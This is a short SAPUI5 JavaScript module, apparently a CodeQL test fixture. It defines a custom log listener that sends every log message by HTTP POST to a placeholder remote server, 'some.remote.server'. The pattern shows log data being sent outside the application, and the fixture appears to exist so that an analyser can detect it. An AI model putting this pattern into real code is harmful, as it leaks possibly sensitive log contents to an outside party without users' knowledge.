sap.ui.define(
  ["sap/ui/base/Object", "sap/base/Log"],
  function (BaseObject, Log) {
    "use strict";
    return BaseObject.extend("codeql-sap-js.log.CustomLogListener", {
      constructor: function () {
        Log.addLogListener(this);
      },
      onLogEntry: function (oEvent) {
        const http = new XMLHttpRequest();
        const url = "https://some.remote.server/location";
        http.open("POST", url);
        http.send(oEvent.message);
      },
    });
  },
);